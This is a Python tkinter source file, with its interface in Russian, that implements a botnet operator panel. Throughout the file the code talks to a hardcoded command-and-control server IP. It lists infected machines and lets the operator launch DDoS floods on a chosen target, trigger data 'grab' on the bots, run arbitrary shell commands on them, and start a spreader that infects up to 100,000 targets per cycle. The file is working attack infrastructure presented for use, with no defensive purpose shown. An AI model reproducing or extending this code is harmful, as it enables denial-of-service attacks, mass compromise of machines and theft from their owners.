import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
import threading, socket, json, time, subprocess, os

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.spreader_process = None
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # Вкладка "Боты"
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")
        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)

        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize())
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Вкладка "Спредер"
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)
        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8).pack(side=tk.LEFT, padx=5)
        self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
        self.btn_start_spread.pack(side=tk.LEFT, padx=10)
        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Консоль команд
        cmd_frame = ttk.LabelFrame(self, text="Команда ботам")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        self.cmd_entry = ttk.Entry(cmd_frame, width=50)
        self.cmd_entry.pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).pack(side=tk.LEFT, padx=2)
        self.output_text = scrolledtext.ScrolledText(cmd_frame, height=4, bg="white")
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _auto_refresh(self):
        self.refresh_bots()
        self.after(5000, self._auto_refresh)

    def refresh_bots(self):
        threading.Thread(target=self._fetch_bots, daemon=True).start()

    def _fetch_bots(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(b"list")
            data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
            sock.close()
            bots = json.loads(data)
            self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
            self._update_tree(bots)
        except Exception as e:
            print(f"[BotnetTab] Ошибка обновления: {e}")

    def _update_tree(self, bots):
        self.tree.delete(*self.tree.get_children())
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            if bot.get("ip") == "77.79.168.92": continue
            values = (bot["ip"], bot.get("hostname",""), bot.get("os",""), bot.get("cpu",""), bot.get("ram",""), bot.get("status",""), bot.get("rps",0), bot.get("last_seen",""))
            self.tree.insert("", "end", values=values)
            if bot.get("status") == "online": online += 1
            total_rps += int(bot.get("rps",0))
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")

    def _send_raw(self, msg):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            sock.sendall(msg.encode())
            resp = sock.recv(1024)
            sock.close()
            return resp
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
            return None

    def launch_attack(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        target = simpledialog.askstring("Цель", "URL/IP цели:")
        if not target: return
        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
        if not method: return
        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
        if threads is None: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")

    def launch_grab(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"grab:{','.join(bot_ips)}")

    def stop_selected(self):
        selected = self.tree.selection()
        if not selected: return
        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
        self._send_raw(f"stop:{','.join(bot_ips)}")

    def send_custom_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd: return
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Ошибка", "Выберите ботов")
            return
        ips = [self.tree.item(i, "values")[0] for i in selected]
        for ip in ips:
            self._send_raw(f"exec:{ip}:{cmd}")

    def toggle_spreader(self):
        if self.spreader_process and self.spreader_process.poll() is None:
            self.spreader_process.terminate()
            self.btn_start_spread.config(text="Запустить спредер")
            self.spread_log.insert(tk.END, "[*] Спредер остановлен\n")
            self.spreader_process = None
        else:
            count = self.scale_var.get()
            self.spread_log.insert(tk.END, f"[*] Запуск спредера, целей: {count}\n")
            threading.Thread(target=self._run_spreader, args=(count,), daemon=True).start()

    def _run_spreader(self, count):
        try:
            script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            self.spreader_process = subprocess.Popen(
                ["python", script_path, "--count", str(count)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
            )
            self.btn_start_spread.config(text="Остановить спредер")
            for line in iter(self.spreader_process.stdout.readline, ''):
                self.spread_log.insert(tk.END, line)
                self.spread_log.see(tk.END)
        except Exception as e:
            self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.btn_start_spread.config(text="Запустить спредер")
